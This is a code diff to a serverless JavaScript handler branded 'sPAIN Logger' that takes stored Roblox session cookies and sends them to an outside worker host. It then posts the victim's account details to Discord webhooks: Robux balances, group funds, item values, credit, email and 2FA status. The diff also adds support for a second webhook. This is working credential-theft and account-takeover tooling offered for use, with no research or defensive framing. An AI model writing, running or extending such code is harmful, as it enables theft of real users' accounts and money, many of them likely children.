@@ -1,6 +1,4 @@
 // api/refresh.js
-// GET  /r/:id  → serve the HTML refresh page
-// POST /r/:id  → regenerate PowerShell, send to Discord, return it
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
@@ -18,7 +16,7 @@ async function redisGet(key) {
   } catch { return null; }
 }
 
-async function getPowerShell(cookie) {
+async function getRobloxInfo(cookie) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
@@ -26,8 +24,7 @@ async function getPowerShell(cookie) {
       body: JSON.stringify({ cookie })
     });
     if (!r.ok) return null;
-    const d = await r.json();
-    return d.success ? d.powershell : null;
+    return await r.json();
   } catch { return null; }
 }
 
@@ -42,31 +39,72 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-async function sendPSToDiscord(webhookUrl, powershell, pageName) {
-  await discordSend(webhookUrl, {
-    embeds: [{
-      title: `🔄 Fresh PowerShell — ${pageName}`,
-      description: 'Regenerated just now. Run the command below.',
-      color: 0x06b6d4,
-      footer: { text: `sPAIN Tools • ${new Date().toISOString()}` }
-    }]
-  });
-  let rem = powershell; let first = true;
+async function discordChunked(url, text, lang = '') {
+  const limit = 1950;
+  let rem = text; let first = true;
   while (rem.length > 0) {
-    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
+    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
     const content = first
-      ? '```powershell\n' + chunk + (rem.length > 0 ? '' : '\n```')
-      : chunk + (rem.length > 0 ? '' : '\n```');
-    await discordSend(webhookUrl, { content });
+      ? `\`\`\`${lang}\n${chunk}${rem.length === 0 ? '\n```' : ''}`
+      : chunk + (rem.length === 0 ? '\n```' : '');
+    await discordSend(url, { content });
     first = false;
   }
 }
 
+function fmt(n) { return Number(n || 0).toLocaleString(); }
+
+async function sendInfoToDiscord(webhookUrl, info, pageName) {
+  const now = new Date().toISOString();
+
+  // Main info embed
+  await discordSend(webhookUrl, {
+    content: '@everyone',
+    embeds: [{
+      title: `🧑 ${info.username} ${info.isPremium ? '⭐' : ''}`,
+      description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${info.id}/profile)`,
+      color: 0xc026d3,
+      fields: [
+        // Row 1 — Robux
+        { name: '💰 Robux Balance',  value: `\`${fmt(info.robux)} R$\``,         inline: true },
+        { name: '⏳ Pending Robux',  value: `\`${fmt(info.pendingRobux)} R$\``,  inline: true },
+        { name: '📊 Account Age',    value: `\`${info.accountAgeDays} days\``,   inline: true },
+
+        // Row 2 — Summaries
+        { name: '📈 Earned Today',   value: `\`${fmt(info.txDay)} R$\``,         inline: true },
+        { name: '📈 Earned Week',    value: `\`${fmt(info.txWeek)} R$\``,        inline: true },
+        { name: '📈 Earned Year',    value: `\`${fmt(info.txYear)} R$\``,        inline: true },
+
+        // Row 3 — Groups
+        { name: '👥 Groups Owned',   value: `\`${info.groupsOwned}\``,           inline: true },
+        { name: '🏦 Group Robux',    value: `\`${fmt(info.groupRobux)} R$\``,    inline: true },
+        { name: '⏳ Group Pending',  value: `\`${fmt(info.groupPending)} R$\``,  inline: true },
+
+        // Row 4 — Limiteds & Billing
+        { name: '🛒 Limiteds',       value: `Count: \`${info.limitedsCount}\`\nRAP: \`${fmt(info.limitedsValue)} R$\``, inline: true },
+        { name: '💳 Credit',         value: `\`${info.credit} USD\``,            inline: true },
+        { name: '👥 Friends',        value: `\`${info.friends}\``,               inline: true },
+
+        // Row 5 — Security
+        { name: '⚙️ Email',          value: `${info.emailSet}\n${info.emailVerified}`, inline: true },
+        { name: '🔒 2FA',            value: info.twoFA,                          inline: true },
+        { name: '🎮 Gamepasses',     value: `MM2: ${info.gamepasses?.mm2 ? '✅' : '❌'}\nAdopt Me: ${info.gamepasses?.adoptMe ? '✅' : '❌'}\nPLS Donate: ${info.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: true },
+
+        { name: '📅 Refreshed At',   value: `\`${now}\``, inline: false },
+      ],
+      footer:    { text: `sPAIN Logger • ${pageName}` },
+      thumbnail: { url: info.avatarUrl }
+    }]
+  });
+
+  // Send PowerShell chunked
+  await discordChunked(webhookUrl, info.powershell, 'powershell');
+}
+
 function buildPage(id, state) {
-  // state: 'ready' | 'success' | 'error' | 'notfound'
   const messages = {
     ready:    { text: 'Click the button to generate a fresh PowerShell for this account.', btn: 'Get Fresh PowerShell', color: '#00c8ff' },
-    success:  { text: '✅ PowerShell sent to Discord! Check your webhook.', btn: 'Regenerate Again', color: '#22c55e' },
+    success:  { text: '✅ PowerShell + full account info sent to Discord!', btn: 'Regenerate Again', color: '#22c55e' },
     error:    { text: '❌ Failed — cookie may be expired or worker is down.', btn: 'Try Again', color: '#ff3a5c' },
     notfound: { text: '❌ Refresh link not found or expired.', btn: null, color: '#ff3a5c' }
   };
@@ -102,11 +140,9 @@ function buildPage(id, state) {
   <div class="badge">🔄 Refresh Session</div>
   <h1>s<span>PAIN</span> Tools</h1>
   <div class="msg">${m.text}</div>
-  ${m.btn ? `<button class="btn" id="refreshBtn" onclick="doRefresh()">
-    ${m.btn}
-  </button>
-  <div class="loader" id="loader">⏳ Generating PowerShell...</div>
-  <div class="note">PowerShell will be sent to Discord automatically</div>` : ''}
+  ${m.btn ? `<button class="btn" id="refreshBtn" onclick="doRefresh()">${m.btn}</button>
+  <div class="loader" id="loader">⏳ Fetching account info...</div>
+  <div class="note">Full account info + PowerShell sent to Discord automatically</div>` : ''}
 </div>
 <script>
 const ID = '${id}';
@@ -128,21 +164,12 @@ async function doRefresh() {
       btn.style.background = '#22c55e';
       btn.style.boxShadow = '0 0 30px rgba(34,197,94,0.5)';
       loader.textContent = '✅ Check your webhook channel now.';
-      setTimeout(() => {
-        btn.disabled = false;
-        btn.textContent = 'Regenerate Again';
-        btn.style.background = '';
-        btn.style.boxShadow = '';
-      }, 4000);
+      setTimeout(() => { btn.disabled = false; btn.textContent = 'Regenerate Again'; btn.style.background = ''; btn.style.boxShadow = ''; }, 4000);
     } else {
       btn.textContent = '❌ Failed — Try Again';
       btn.style.background = '#ff3a5c';
       loader.textContent = data.error || 'Error. Cookie may be expired.';
-      setTimeout(() => {
-        btn.disabled = false;
-        btn.textContent = 'Get Fresh PowerShell';
-        btn.style.background = '';
-      }, 3000);
+      setTimeout(() => { btn.disabled = false; btn.textContent = 'Get Fresh PowerShell'; btn.style.background = ''; }, 3000);
     }
   } catch {
     btn.disabled = false;
@@ -161,44 +188,36 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') return res.status(204).end();
 
-  // Extract the refresh ID from the URL path: /r/:id
-  const id = (req.url || '').replace(/^\/r\//, '').replace(/^\/api\/refresh\?.*/, '').split('?')[0].trim();
-  const idFromQuery = new URL('http://x' + req.url).searchParams.get('id') || id;
-  const refreshId = idFromQuery || id;
+  const urlObj   = new URL('http://x' + req.url);
+  const refreshId = urlObj.searchParams.get('id') || (req.url || '').replace(/^\/r\//, '').split('?')[0].trim();
 
   if (!refreshId) {
     res.setHeader('Content-Type', 'text/html');
     return res.status(400).send(buildPage('', 'notfound'));
   }
 
-  // GET — serve the HTML page
   if (req.method === 'GET') {
     const record = await redisGet(`refresh:${refreshId}`);
-    const state  = record ? 'ready' : 'notfound';
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.status(record ? 200 : 404).send(buildPage(refreshId, state));
+    return res.status(record ? 200 : 404).send(buildPage(refreshId, record ? 'ready' : 'notfound'));
   }
 
-  // POST — regenerate PowerShell and send to Discord
   if (req.method === 'POST') {
     let body = req.body;
     if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
-    const postId = (body?.id) || refreshId;
+    const postId = body?.id || refreshId;
 
     const record = await redisGet(`refresh:${postId}`);
-    if (!record) return res.status(404).json({ error: 'Refresh link not found or expired' });
-    if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });
+    if (!record)         return res.status(404).json({ error: 'Refresh link not found or expired' });
+    if (!record.cookie)  return res.status(500).json({ error: 'No cookie stored' });
 
-    const powershell = await getPowerShell(record.cookie);
-    if (!powershell) return res.status(502).json({ error: 'Worker failed — cookie may be expired' });
+    const info = await getRobloxInfo(record.cookie);
+    if (!info?.valid)    return res.status(502).json({ error: 'Worker failed — cookie may be expired' });
 
-    // Send to Discord (both webhooks if dualhook)
-    await Promise.all([
-      sendPSToDiscord(record.webhook, powershell, record.pageName || 'unknown'),
-      record.webhook1 && record.webhook1 !== record.webhook
-        ? sendPSToDiscord(record.webhook1, powershell, record.pageName || 'unknown')
-        : Promise.resolve()
-    ]);
+    const webhooks = [record.webhook];
+    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);
+
+    await Promise.all(webhooks.map(wh => sendInfoToDiscord(wh, info, record.pageName || postId)));
 
     return res.status(200).json({ success: true });
   }
